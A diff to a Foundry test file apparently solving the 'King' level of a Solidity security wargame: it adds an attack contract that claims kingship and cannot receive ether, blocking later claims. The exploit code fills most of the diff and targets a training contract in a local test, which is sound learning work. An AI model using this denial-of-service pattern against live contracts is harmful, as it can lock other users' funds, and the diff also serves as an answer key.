@@ -4,6 +4,12 @@ pragma solidity ^0.8.13;
 import {Test, console} from "forge-std/Test.sol";
 import {King} from "../src/09_King.sol";
 
+contract AttackContract  {
+    constructor(King target) payable {
+        payable(address(target)).call{value: target.prize()}("");
+    }
+}
+
 contract TestKing is Test {
     address public player = address(0xbad);
     address public bob = address(0xb0b);
@@ -21,7 +27,7 @@ contract TestKing is Test {
         assertEq(instance._king(), address(bob));
         vm.startPrank(player);
 
-        // Your exploit goes here
+        new AttackContract{value: player.balance}(instance);
 
         vm.stopPrank();
 
